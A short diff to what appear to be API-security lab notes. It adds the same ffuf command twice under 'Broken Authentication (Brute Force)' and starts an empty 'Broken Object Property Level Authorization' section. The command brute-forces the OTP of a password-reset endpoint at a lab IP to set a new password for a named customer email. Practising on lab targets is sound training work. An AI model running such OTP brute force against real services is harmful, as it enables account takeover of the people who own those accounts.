@@ -62,5 +62,14 @@ done
 ```
 # Broken Authentication (Brute Force)
 ```bash
+ffuf -w tokens.txt:EMAIL -X 'POST'  -u 'http://94.237.120.233:56026/api/v1/authentication/customers/passwords/resets' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{ "Email": "MasonJenkins@ymail.com", "OTP": "EMAIL", "NewPassword": "hola123" }'  -t 100 -fs 23 
+```
 
+# Broken Authentication (Brute Force)
+```bash
+ffuf -w tokens.txt:EMAIL -X 'POST'  -u 'http://94.237.120.233:56026/api/v1/authentication/customers/passwords/resets' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{ "Email": "MasonJenkins@ymail.com", "OTP": "EMAIL", "NewPassword": "hola123" }'  -t 100 -fs 23 
+```
+
+# Broken Object Property Level Authorization
+```bash
 ```
